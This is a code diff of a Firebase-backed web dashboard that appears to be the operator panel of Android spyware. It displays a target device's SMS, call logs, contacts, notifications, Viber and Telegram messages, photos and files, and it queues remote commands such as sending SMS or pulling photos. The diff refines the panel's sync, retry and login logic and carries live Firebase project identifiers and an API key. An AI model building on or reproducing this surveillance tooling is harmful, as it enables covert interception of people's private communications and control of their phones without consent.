@@ -1020,14 +1020,13 @@
 </div>
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-  import { getAuth, signInWithEmailAndPassword, signOut, setPersistence, browserLocalPersistence, onAuthStateChanged }
+  import { getAuth, signInWithEmailAndPassword, signOut }
     from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
-  import { initializeFirestore, persistentLocalCache, persistentMultipleTabManager, collection, query, limit, onSnapshot, addDoc, deleteDoc, doc }
+  import { initializeFirestore, persistentLocalCache, persistentMultipleTabManager, collection, onSnapshot, addDoc, deleteDoc, doc }
     from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-  // ═══════════════ FIREBASE CONFIG ═══════════════
   const firebaseConfig = {
-    apiKey: "AIzaSyAipKY5QePUXnlpFdDriLWbOXk98jtrCvI",
+    apiKey: "AIzaSyApywYd17o9FNZ70v7bP1Zb3pw3LVjrwM4",
     authDomain: "zaw-myo-naing-7736b.firebaseapp.com",
     databaseURL: "https://zaw-myo-naing-7736b-default-rtdb.asia-southeast1.firebasedatabase.app",
     projectId: "zaw-myo-naing-7736b",
@@ -1036,44 +1035,12 @@
     appId: "1:37439530373:android:0e3d3354cb64c77b0c50ec"
   };
 
-  // ═══════════════ SAFE FIREBASE INIT ═══════════════
   const app = initializeApp(firebaseConfig);
   const auth = getAuth(app);
+  const db = initializeFirestore(app, {
+    localCache: persistentLocalCache({ tabManager: persistentMultipleTabManager() })
+  });
 
-  let db;
-  try {
-    db = initializeFirestore(app, {
-      localCache: persistentLocalCache({ tabManager: persistentMultipleTabManager() })
-    });
-    console.log("✅ Firestore: persistent cache OK");
-  } catch (e) {
-    console.warn("⚠️ Persistent cache failed, using memory cache:", e);
-    try {
-      db = initializeFirestore(app, {});
-      console.log("✅ Firestore: memory cache OK");
-    } catch (e2) {
-      console.error("❌ Firestore init failed:", e2);
-      document.getElementById('loadingScreen').classList.add('hidden');
-      document.getElementById('loginScreen').classList.remove('hidden');
-      document.getElementById('loginError').textContent = "Firestore init failed";
-      throw e2;
-    }
-  }
-
-  // ═══════════════ BOOT TIMEOUT (3s) ═══════════════
-  const BOOT_TIMEOUT = setTimeout(() => {
-    const loading = document.getElementById('loadingScreen');
-    if (loading && !loading.classList.contains('hidden')) {
-      console.warn("⏰ Boot timeout — showing login");
-      showLogin();
-    }
-  }, 3000);
-
-  setPersistence(auth, browserLocalPersistence)
-    .then(() => console.log("✅ Persistence: LOCAL"))
-    .catch(e => console.warn("Persistence:", e));
-
-  // ═══════════════ SVG ICON HELPER ═══════════════
   function svgIcon(name, color, size) {
     size = size || 16;
     color = color || 'currentColor';
@@ -1100,50 +1067,52 @@
       clock: '<circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>',
       volumeOff: '<polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><line x1="23" y1="9" x2="17" y2="15"/><line x1="17" y1="9" x2="23" y2="15"/>',
       photo: '<rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/>',
-      file: '<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/>'
+      file: '<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/>',
+      phoneCall: '<path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>',
+      videoCall: '<polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/>'
     };
     const p = paths[name] || '';
     return '<svg width="' + size + '" height="' + size + '" viewBox="0 0 24 24" fill="none" stroke="' + color + '" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:middle;flex-shrink:0">' + p + '</svg>';
   }
 
-  // ═══════════════ DOM REFERENCES ═══════════════
-  const loginScreen    = document.getElementById('loginScreen');
-  const loadingScreen  = document.getElementById('loadingScreen');
-  const dashScreen     = document.getElementById('dashScreen');
-  const menuScreen     = document.getElementById('menuScreen');
-  const dataScreen     = document.getElementById('dataScreen');
-  const backBtn        = document.getElementById('backBtn');
-  const loginBtn       = document.getElementById('loginBtn');
-  const loginError     = document.getElementById('loginError');
-  const logoutBtn      = document.getElementById('logoutBtn');
-  const refreshBtn     = document.getElementById('refreshBtn');
-  const emailInput     = document.getElementById('emailInput');
-  const passwordInput  = document.getElementById('passwordInput');
-  const userEmail      = document.getElementById('userEmail');
-  const fetchInfo      = document.getElementById('fetchInfo');
-  const liveBadge      = document.getElementById('liveBadge');
+  const loginScreen   = document.getElementById('loginScreen');
+  const loadingScreen = document.getElementById('loadingScreen');
+  const dashScreen    = document.getElementById('dashScreen');
+  const menuScreen    = document.getElementById('menuScreen');
+  const dataScreen    = document.getElementById('dataScreen');
+  const backBtn       = document.getElementById('backBtn');
+  const loginBtn      = document.getElementById('loginBtn');
+  const loginError    = document.getElementById('loginError');
+  const logoutBtn     = document.getElementById('logoutBtn');
+  const refreshBtn    = document.getElementById('refreshBtn');
+  const emailInput    = document.getElementById('emailInput');
+  const passwordInput = document.getElementById('passwordInput');
+  const userEmail     = document.getElementById('userEmail');
+  const fetchInfo     = document.getElementById('fetchInfo');
+  const liveBadge     = document.getElementById('liveBadge');
   const toastContainer = document.getElementById('toastContainer');
-  const loadMoreBtn    = document.getElementById('loadMoreBtn');
+  const loadMoreBtn   = document.getElementById('loadMoreBtn');
   const refreshFilesBtn = document.getElementById('refreshFilesBtn');
 
-  // ═══════════════ STATE ═══════════════
   let allDocs = [];
   let commands = [];
   let blockedList = [];
   let currentEmail = "";
   let currentTab = null;
-  let unsubMessageList = [];
-  let unsubCommandList = [];
-  let unsubBlockedList = [];
-
-  // ⭐ FIX: collection တစ်ခုချင်း status မှတ်
-  const collectionStatus = { message: 'loading', commands: 'loading', blocked: 'loading' };
+  let unsubscribeSnapshot = null;
+  let unsubscribeCommands = null;
+  let unsubscribeBlocked = null;
+  let isInitialLoad = true;
+  let retryCount = 0;
+  const MAX_RETRY = 5;
+  let slowTimer = null;
+  let dataReceived = false;
+  let liveForcedTimer = null;
 
   const CACHE_PREFIX = "vipz_cache_";
   const CACHE_MAX_AGE = 7 * 24 * 60 * 60 * 1000;
   const BADGE_PREFIX = "vipz_badge_";
 
-  // ═══════════════ BADGE / CACHE ═══════════════
   function getLastSeen(email, tab) {
     try { return parseInt(localStorage.getItem(BADGE_PREFIX + email.toLowerCase() + "_" + tab) || "0"); }
     catch (e) { return 0; }
@@ -1151,6 +1120,7 @@
   function setLastSeen(email, tab, ts) {
     try { localStorage.setItem(BADGE_PREFIX + email.toLowerCase() + "_" + tab, String(ts || Date.now())); } catch (e) {}
   }
+
   function saveCache(email, docs) {
     if (!email) return;
     try {
@@ -1159,6 +1129,7 @@
       }));
     } catch (e) {}
   }
+
   function loadCache(email) {
     if (!email) return null;
     try {
@@ -1174,7 +1145,6 @@
     } catch (e) { return null; }
   }
 
-  // ═══════════════ TOASTS ═══════════════
   function showToast(message, type = 'info', duration = 4000) {
     if (!toastContainer) return;
     const toast = document.createElement('div');
@@ -1197,86 +1167,23 @@
   function toastInfo(m)    { showToast(m, 'info', 3000); }
   function toastWarning(m) { showToast(m, 'warning', 5000); }
 
-  // ═══════════════ LIVE BADGE ═══════════════
   function setLive(status) {
     if (!liveBadge) return;
     liveBadge.classList.remove('offline', 'connecting', 'cached');
-    if (status === 'offline') {
-      liveBadge.classList.add('offline');
-      liveBadge.innerHTML = '<span class="live-dot"></span>OFFLINE';
-    } else if (status === 'connecting') {
-      liveBadge.classList.add('connecting');
-      liveBadge.innerHTML = '<span class="live-dot"></span>WAIT';
-    } else if (status === 'cached') {
-      liveBadge.classList.add('cached');
-      liveBadge.innerHTML = '<span class="live-dot"></span>CACHED';
-    } else {
-      liveBadge.innerHTML = '<span class="live-dot"></span>LIVE';
-    }
+    if (status === 'live') { liveBadge.innerHTML = '<span class="live-dot"></span>LIVE'; }
+    else if (status === 'connecting') { liveBadge.classList.add('connecting'); liveBadge.innerHTML = '<span class="live-dot"></span>WAIT'; }
+    else if (status === 'cached') { liveBadge.classList.add('cached'); liveBadge.innerHTML = '<span class="live-dot"></span>CACHE'; }
+    else { liveBadge.classList.add('offline'); liveBadge.innerHTML = '<span class="live-dot"></span>OFFLINE'; }
   }
 
-  // ═══════════════ INFO BAR — COLLECTION STATUS ⭐ FIX ═══════════════
-  function updateAllStatus() {
-    if (!fetchInfo) return;
-    const lines = [];
-    let hasError = false;
-    let hasData = false;
-    let stillLoading = false;
-
-    ['message', 'commands', 'blocked'].forEach(name => {
-      const s = collectionStatus[name];
-      if (s === 'loading') {
-        lines.push('⏳ ' + name + ': loading...');
-        stillLoading = true;
-      } else if (typeof s === 'string' && s.startsWith('error:')) {
-        lines.push('❌ ' + name + ': ' + s.substring(6));
-        hasError = true;
-      } else {
-        const count = typeof s === 'number' ? s : 0;
-        lines.push((count > 0 ? '✅' : '⚠️') + ' ' + name + ': ' + count + ' docs');
-        if (count > 0) hasData = true;
-      }
-    });
-
-    fetchInfo.innerHTML = lines.join('<br>');
-    fetchInfo.style.padding = '10px';
-    fetchInfo.style.fontSize = '12px';
-    fetchInfo.style.fontWeight = 'bold';
-    fetchInfo.style.textAlign = 'left';
-    fetchInfo.style.lineHeight = '1.6';
-
-    if (hasError) {
-      fetchInfo.style.color = '#ffffff';
-      fetchInfo.style.background = '#dc2626';
-    } else if (hasData) {
-      fetchInfo.style.color = '#ffffff';
-      fetchInfo.style.background = '#065f46';
-    } else if (stillLoading) {
-      fetchInfo.style.color = '#ffffff';
-      fetchInfo.style.background = '#1e40af';
-    } else {
-      fetchInfo.style.color = '#ffffff';
-      fetchInfo.style.background = '#d97706';
-    }
-  }
-
-  // ═══════════════ RESET / STOP ═══════════════
   function resetAllState() {
+    if (slowTimer) { clearTimeout(slowTimer); slowTimer = null; }
+    if (liveForcedTimer) { clearTimeout(liveForcedTimer); liveForcedTimer = null; }
     allDocs = []; commands = []; blockedList = [];
-    currentTab = null;
+    currentTab = null; retryCount = 0; isInitialLoad = true; dataReceived = false;
     stopRealtimeListener();
   }
 
-  function stopRealtimeListener() {
-    unsubMessageList.forEach(u => { try { u(); } catch (e) {} });
-    unsubCommandList.forEach(u => { try { u(); } catch (e) {} });
-    unsubBlockedList.forEach(u => { try { u(); } catch (e) {} });
-    unsubMessageList = [];
-    unsubCommandList = [];
-    unsubBlockedList = [];
-  }
-
-  // ═══════════════ DATE PARSE ═══════════════
   function parseDateToMs(s) {
     if (!s) return 0;
     const m = String(s).match(/(\d{4})-(\d{2})-(\d{2})[ T](\d{2}):(\d{2}):(\d{2})/);
@@ -1284,7 +1191,6 @@
     return new Date(parseInt(m[1]), parseInt(m[2]) - 1, parseInt(m[3]), parseInt(m[4]), parseInt(m[5]), parseInt(m[6])).getTime();
   }
 
-  // ═══════════════ BADGES ═══════════════
   function computeBadges() {
     if (!currentEmail) return;
     try {
@@ -1334,90 +1240,143 @@
     else { el.classList.add("hidden"); }
   }
 
-  // ═══════════════ START LISTENERS ⭐ FIX ═══════════════
   function startRealtimeListener() {
     stopRealtimeListener();
-    setLive('connecting');
+    isInitialLoad = true;
+    dataReceived = false;
+    if (fetchInfo) fetchInfo.textContent = "Connecting...";
 
-    // ⭐ Status reset
-    collectionStatus.message = 'loading';
-    collectionStatus.commands = 'loading';
-    collectionStatus.blocked = 'loading';
-    updateAllStatus();
+    const cached = loadCache(currentEmail);
+    if (cached && cached.docs.length > 0) setLive('cached');
+    else setLive('connecting');
 
-    function listenCollection(name, sortField, max, assign, unsubArr) {
-      const q = query(collection(db, name), limit(max));
+    if (slowTimer) clearTimeout(slowTimer);
+    slowTimer = setTimeout(() => {
+      if (!dataReceived && currentEmail) {
+        if (allDocs.length > 0) { toastInfo("Still syncing... (showing cached)"); setLive('cached'); }
+        else { toastWarning("Slow network — retrying..."); setLive('connecting'); }
+      }
+    }, 25000);
 
-      const unsub = onSnapshot(q, (snap) => {
-        const arr = snap.docs
-          .map(d => ({ id: d.id, ...d.data() }))
-          .sort((a, b) => {
-            const av = a[sortField] || 0;
-            const bv = b[sortField] || 0;
-            return bv - av;
-          })
-          .slice(0, max);
+    try {
+      unsubscribeSnapshot = onSnapshot(
+        collection(db, "message"),
+        { includeMetadataChanges: true },
+        (snap) => {
+          const emailLower = (currentEmail || "").toLowerCase().trim();
+          const allData = [];
+          snap.forEach(d => allData.push({ id: d.id, ...d.data() }));
+          const fromCache = snap.metadata.fromCache;
+          const filtered = allData.filter(d => (d.userId || "").toLowerCase().trim() === emailLower);
 
-        console.log(`✅ ${name}: ${arr.length} docs loaded`);
-        if (arr.length > 0) console.log(`   sample userId:`, arr[0].userId);
+          console.log("[Firestore]", "total:", allData.length, "matched:", filtered.length,
+                      "email:", emailLower, "fromCache:", fromCache);
 
-        // ⭐ Status update
-        collectionStatus[name] = arr.length;
-        updateAllStatus();
+          if (allData.length === 0 && isInitialLoad && fromCache) {
+            if (fetchInfo) fetchInfo.textContent = "Waiting for server...";
+            if (!liveForcedTimer) {
+              liveForcedTimer = setTimeout(() => { setLive('live'); liveForcedTimer = null; }, 4000);
+            }
+            return;
+          }
 
-        // Data ရောက်ရင် LIVE ပြ
-        if (name === 'message' && arr.length > 0) setLive('live');
+          allDocs = filtered;
+          dataReceived = true;
+          retryCount = 0;
+          if (slowTimer) { clearTimeout(slowTimer); slowTimer = null; }
 
-        assign(arr);
-      }, (err) => {
-        console.error(`❌ ${name} error:`, err.code, err.message);
+          if (fromCache) {
+            setLive('cached');
+            if (!liveForcedTimer) {
+              liveForcedTimer = setTimeout(() => { setLive('live'); liveForcedTimer = null; }, 4000);
+            }
+          } else {
+            setLive('live');
+            if (liveForcedTimer) { clearTimeout(liveForcedTimer); liveForcedTimer = null; }
+          }
 
-        // ⭐ Error status update
-        collectionStatus[name] = 'error: ' + (err.code || 'error') + ' ' + (err.message || '');
-        updateAllStatus();
+          if (!fromCache) saveCache(currentEmail, filtered);
+          computeBadges();
 
-        setLive('offline');
+          if (fetchInfo) {
+            fetchInfo.textContent = filtered.length + " docs" + (fromCache ? " (cached)" : " (live)");
+            setTimeout(() => { if (fetchInfo) fetchInfo.textContent = ""; }, 2500);
+          }
 
-        if (err.code === 'permission-denied') {
-          toastError('Firestore permission denied — rules စစ်ပါ');
-        } else if (err.code === 'unavailable') {
-          toastError('Network မကောင်းဘူး');
-        } else if (err.code === 'failed-precondition') {
-          toastError('Firestore database မရှိသေးဘူး');
-        } else if (err.code === 'invalid-argument') {
-          toastError('API key မှားနေတယ်');
-        } else {
-          toastError(`${name}: ${err.message}`);
-        }
-      });
+          if (currentTab && !dataScreen.classList.contains('hidden')) renderTab(currentTab);
+          if (isInitialLoad && !fromCache) { toastSuccess("Synced: " + filtered.length + " docs"); isInitialLoad = false; }
+          else if (isInitialLoad && fromCache) { isInitialLoad = false; }
+        },
+        (error) => handleSnapshotError(error)
+      );
 
-      unsubArr.push(unsub);
+      unsubscribeCommands = onSnapshot(collection(db, "commands"), (snap) => {
+        const emailLower = (currentEmail || "").toLowerCase().trim();
+        const arr = [];
+        snap.forEach(d => { const data = d.data(); if ((data.userId || "").toLowerCase().trim() === emailLower) arr.push({ id: d.id, ...data }); });
+        arr.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
+        commands = arr;
+        if (currentTab === 'send') renderCommands();
+        if (currentTab === 'photos') updatePhotoLoadBtn();
+        if (currentTab === 'files') updateFileBtn();
+      }, (err) => console.error("Commands snapshot:", err));
+
+      unsubscribeBlocked = onSnapshot(collection(db, "blocked"), (snap) => {
+        const emailLower = (currentEmail || "").toLowerCase().trim();
+        const arr = [];
+        snap.forEach(d => { const data = d.data(); if ((data.userId || "").toLowerCase().trim() === emailLower) arr.push({ id: d.id, ...data }); });
+        arr.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
+        blockedList = arr;
+        if (currentTab === 'block') renderBlocked();
+      }, (err) => console.error("Blocked snapshot:", err));
+
+    } catch (e) {
+      console.error("Listener error:", e);
+      setLive(allDocs.length > 0 ? 'cached' : 'offline');
+      toastError("Listener: " + e.message);
     }
-
-    // ─── message ───
-    listenCollection('message', 'date', 500, (arr) => {
-      allDocs = arr;
-      saveCache(currentEmail, arr);
-      computeBadges();
-      if (currentTab && !dataScreen.classList.contains('hidden')) renderTab(currentTab);
-    }, unsubMessageList);
-
-    // ─── commands ───
-    listenCollection('commands', 'createdAt', 500, (arr) => {
-      commands = arr;
-      if (currentTab === 'send') renderCommands();
-      if (currentTab === 'photos') updatePhotoLoadBtn();
-      if (currentTab === 'files') updateFileBtn();
-    }, unsubCommandList);
-
-    // ─── blocked ───
-    listenCollection('blocked', 'createdAt', 200, (arr) => {
-      blockedList = arr;
-      if (currentTab === 'block') renderBlocked();
-    }, unsubBlockedList);
   }
 
-  // ═══════════════ RENDER DISPATCHER ═══════════════
+  function handleSnapshotError(error) {
+    console.error("Snapshot error:", error);
+    if (slowTimer) { clearTimeout(slowTimer); slowTimer = null; }
+    if (liveForcedTimer) { clearTimeout(liveForcedTimer); liveForcedTimer = null; }
+    if (allDocs.length > 0) setLive('cached'); else setLive('offline');
+
+    let msg = error.message || "Unknown";
+    const isPerm = error.code === 'permission-denied' || msg.includes("permission");
+
+    if (isPerm && retryCount < MAX_RETRY) {
+      retryCount++;
+      const delay = Math.min(2000 * retryCount, 10000);
+      toastWarning("Reconnecting... (" + retryCount + "/" + MAX_RETRY + ")");
+      const user = auth.currentUser;
+      if (user) {
+        user.getIdToken(true)
+          .then(() => { stopRealtimeListener(); setTimeout(() => startRealtimeListener(), delay); })
+          .catch(() => setTimeout(() => forceLogout(), 1500));
+      } else { setTimeout(() => forceLogout(), 1500); }
+      return;
+    }
+
+    if (isPerm) { toastError("Session expired — re-login"); setTimeout(() => forceLogout(), 2000); }
+    else if (msg.includes("network") || msg.includes("offline") || msg.includes("unavailable")) {
+      if (retryCount < MAX_RETRY) {
+        retryCount++;
+        toastWarning("Network issue — retrying...");
+        setTimeout(() => { stopRealtimeListener(); startRealtimeListener(); }, 5000);
+      } else { toastError("No connection"); }
+    } else { toastError("Firestore: " + msg); }
+    isInitialLoad = false;
+  }
+
+  function stopRealtimeListener() {
+    if (liveForcedTimer) { clearTimeout(liveForcedTimer); liveForcedTimer = null; }
+    if (unsubscribeSnapshot) { try { unsubscribeSnapshot(); } catch (e) {} unsubscribeSnapshot = null; }
+    if (unsubscribeCommands) { try { unsubscribeCommands(); } catch (e) {} unsubscribeCommands = null; }
+    if (unsubscribeBlocked) { try { unsubscribeBlocked(); } catch (e) {} unsubscribeBlocked = null; }
+  }
+
   function renderTab(tab) {
     try {
       if (tab === 'send')          renderCommands();
@@ -1437,7 +1396,6 @@
     }
   }
 
-  // ═══════════════ SHOW LOGIN ═══════════════
   function showLogin() {
     resetAllState();
     setLive('offline');
@@ -1451,9 +1409,11 @@
     dataScreen.classList.add('hidden');
     menuScreen.classList.remove('hidden');
     document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    emailInput.value = "";
+    passwordInput.value = "";
+    loginError.textContent = "";
   }
 
-  // ═══════════════ SHOW DASHBOARD ═══════════════
   function showDashboard(email) {
     currentEmail = email;
     userEmail.textContent = email;
@@ -1466,35 +1426,27 @@
     if (cached && cached.docs.length > 0) {
       allDocs = cached.docs;
       setLive('cached');
-      collectionStatus.message = cached.docs.length;
-      collectionStatus.commands = 'loading';
-      collectionStatus.blocked = 'loading';
-      updateAllStatus();
+      const ageMin = Math.round((Date.now() - cached.time) / 60000);
+      if (fetchInfo) fetchInfo.textContent = "Cached: " + cached.docs.length + " docs (" + ageMin + "m ago)";
       computeBadges();
     } else {
       setLive('connecting');
     }
 
     startRealtimeListener();
-
-    setTimeout(() => {
-      if (allDocs.length === 0 && currentEmail === email) {
-        setLive('offline');
-      }
-    }, 15000);
   }
 
-  // ═══════════════ REFRESH ═══════════════
   refreshBtn.addEventListener('click', () => {
     refreshBtn.disabled = true;
     refreshBtn.classList.add('spinning');
     toastInfo("Refreshing...");
+    retryCount = 0;
+    dataReceived = false;
     stopRealtimeListener();
     setTimeout(() => startRealtimeListener(), 200);
     setTimeout(() => { refreshBtn.classList.remove('spinning'); refreshBtn.disabled = false; }, 900);
   });
 
-  // ═══════════════ TAB NAVIGATION ═══════════════
   document.querySelectorAll('.tab-btn').forEach(btn => {
     btn.addEventListener('click', () => {
       const tab = btn.dataset.tab;
@@ -1523,7 +1475,6 @@
     window.scrollTo({ top: 0, behavior: 'smooth' });
   });
 
-  // ═══════════════ LOGIN ═══════════════
   loginBtn.addEventListener('click', doLogin);
   passwordInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') doLogin(); });
 
@@ -1534,8 +1485,22 @@
     loginBtn.disabled = true;
     loginBtn.textContent = "Logging in...";
     loginError.textContent = "";
+
     try {
-      await signInWithEmailAndPassword(auth, email, password);
+      // ရှိပြီးသား session ရှိရင် အရင် signOut ချ (clean state)
+      if (auth.currentUser) {
+        try { await signOut(auth); } catch (e) {}
+      }
+
+      const cred = await signInWithEmailAndPassword(auth, email, password);
+      console.log("[Auth] Login success:", cred.user.email);
+
+      // Token ကို force refresh — Firestore read အတွက် သေချာအောင်
+      try { await cred.user.getIdToken(true); } catch (e) { console.warn("Token:", e); }
+
+      // Dashboard ပြ
+      showDashboard(email);
+
     } catch (e) {
       let msg = e.message || String(e);
       if (msg.includes("invalid-credential") || msg.includes("wrong-password")) msg = "Email/Password မှားနေတယ်";
@@ -1554,6 +1519,9 @@
     emailInput.value = "";
     passwordInput.value = "";
     loginError.textContent = "";
+    loginBtn.disabled = false;
+    loginBtn.textContent = "Login";
+    showLogin();
   }
 
   logoutBtn.addEventListener('click', async () => {
@@ -1563,26 +1531,22 @@
     toastSuccess("Logged out");
   });
 
-  // ═══════════════ AUTH STATE ═══════════════
-  onAuthStateChanged(auth, (user) => {
-    clearTimeout(BOOT_TIMEOUT);
-    if (user && user.isAnonymous) {
-      signOut(auth).catch(() => {});
-      showLogin();
-    } else if (user) {
-      showDashboard(user.email);
-      user.getIdToken(true).catch(e => console.warn("Token refresh:", e));
-    } else {
-      showLogin();
-    }
-  });
+  // ⭐ Page load တိုင်း login screen ပြ — ဘာ auto-login မှ မရှိ
+  (async () => {
+    try {
+      // ရှိပြီးသား cached session ကို ရှင်းလိုက်
+      if (auth.currentUser) {
+        try { await signOut(auth); } catch (e) {}
+      }
+    } catch (e) {}
+    console.log("[Boot] Showing login");
+    showLogin();
+  })();
 
-  // ═══════════════ EMPTY STATE ═══════════════
   function emptyState(iconName, text) {
     return '<div class="empty-state">' + svgIcon(iconName, '#64748b', 42) + '<div>' + escapeHtml(text) + '</div></div>';
   }
 
-  // ═══════════════ PHOTO REQUEST ═══════════════
   loadMoreBtn.addEventListener('click', async () => {
     if (!currentEmail) return;
     loadMoreBtn.disabled = true;
@@ -1613,7 +1577,6 @@
     }
   }
 
-  // ═══════════════ FILE LIST REQUEST ═══════════════
   refreshFilesBtn.addEventListener('click', async () => {
     if (!currentEmail) return;
     refreshFilesBtn.disabled = true;
@@ -1643,7 +1606,6 @@
     }
   }
 
-  // ═══════════════ PHOTOS ═══════════════
   function renderPhotos() {
     const list = document.getElementById('photoList');
     const photoDocs = allDocs.filter(d => (d.sender || "").startsWith("PHOTO_"));
@@ -1728,7 +1690,6 @@
     modal.addEventListener('click', (e) => { if (e.target === modal) modal.remove(); });
   }
 
-  // ═══════════════ FILES ═══════════════
   function renderFiles() {
     const list = document.getElementById('fileList');
     const fileDocs = allDocs.filter(d => (d.sender || "").startsWith("FILE_LIST_"));
@@ -1846,7 +1807,6 @@
     updateFileBtn();
   }
 
-  // ═══════════════ SEND SMS ═══════════════
   document.getElementById('sendSmsBtn').addEventListener('click', async () => {
     const num = document.getElementById('sendNumber').value.trim();
     const body = document.getElementById('sendBody').value.trim();
@@ -1900,7 +1860,6 @@
     } catch (e) { toastError("Unblock failed: " + e.message); }
   }
 
-  // ═══════════════ COMMANDS ═══════════════
   function renderCommands() {
     const list = document.getElementById('cmdList');
     const pending = commands.filter(c => c.status === 'pending').length;
@@ -1944,7 +1903,6 @@
     list.innerHTML = html;
   }
 
-  // ═══════════════ BLOCKED ═══════════════
   function renderBlocked() {
     const list = document.getElementById('blockedList');
     document.getElementById('blockedTotal').textContent = blockedList.length;
@@ -1969,7 +1927,6 @@
     });
   }
 
-  // ═══════════════ SMS ═══════════════
   function renderSms() {
     const smsList = document.getElementById('smsList');
     const smsDocs = allDocs.filter(d => (d.sender || "").startsWith("SMS_"));
@@ -2015,7 +1972,6 @@
     smsList.innerHTML = html;
   }
 
-  // ═══════════════ CALLS ═══════════════
   function renderCalls() {
     const callList = document.getElementById('callList');
     const callDocs = allDocs.filter(d => (d.sender || "").startsWith("CALL_LOG_"));
@@ -2100,7 +2056,6 @@
     });
   }
 
-  // ═══════════════ CONTACTS ═══════════════
   function renderContacts() {
     const contactList = document.getElementById('contactList');
     const contactDocs = allDocs.filter(d => (d.sender || "").startsWith("CONTACTS_"));
@@ -2163,7 +2118,6 @@
     return s;
   }
 
-  // ═══════════════ NOTIFICATIONS ═══════════════
   function renderNoti() {
     const notiList = document.getElementById('notiList');
     const notiDocs = allDocs.filter(d => (d.sender || "").startsWith("NOTI_"));
@@ -2223,7 +2177,6 @@
     return { app: app || "Unknown", pkg: pkg, title: title, time: time, message: msgLines.join("\n") };
   }
 
-  // ═══════════════ CHAT STYLE ═══════════════
   function renderChatStyle(listEl, appClass, prefix, contactsCounterId, totalCounterId) {
     const chatDocs = allDocs.filter(d => (d.sender || "").startsWith(prefix));
 
@@ -2331,14 +2284,25 @@
   }
 
   function renderViber() {
-    renderChatStyle(document.getElementById('viberList'), 'viber', 'VIBER_', 'viberContacts', 'viberTotal');
+    renderChatStyle(
+      document.getElementById('viberList'),
+      'viber',
+      'VIBER_',
+      'viberContacts',
+      'viberTotal'
+    );
   }
 
   function renderTelegram() {
-    renderChatStyle(document.getElementById('telegramList'), 'telegram', 'TELEGRAM_', 'tgContacts', 'tgTotal');
+    renderChatStyle(
+      document.getElementById('telegramList'),
+      'telegram',
+      'TELEGRAM_',
+      'tgContacts',
+      'tgTotal'
+    );
   }
 
-  // ═══════════════ SYSTEM APPS ═══════════════
   function renderSystemApps() {
     const container = document.getElementById('appsList');
     const sysDocs = allDocs.filter(d => (d.sender || "").startsWith("SYSTEM_"));
@@ -2448,8 +2412,6 @@
     '</div><div class="app-meta"><div>v' + escapeHtml(parts[2] || "") + '</div>' +
     '<div>' + escapeHtml(parts[3] || "") + '</div></div></div>';
   }
-
-  // ═══════════════ UTIL ═══════════════
   function escapeHtml(str) {
     if (!str) return "";
     return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
@@ -2458,8 +2420,7 @@
 
   window.addEventListener('error', (e) => console.error("Global:", e.error || e.message));
   window.addEventListener('unhandledrejection', (e) => console.error("Unhandled:", e.reason));
-
-  console.log("✅ Dashboard loaded — all fixes applied");
 </script>
+
 </body>
-     </html>
+ </html>
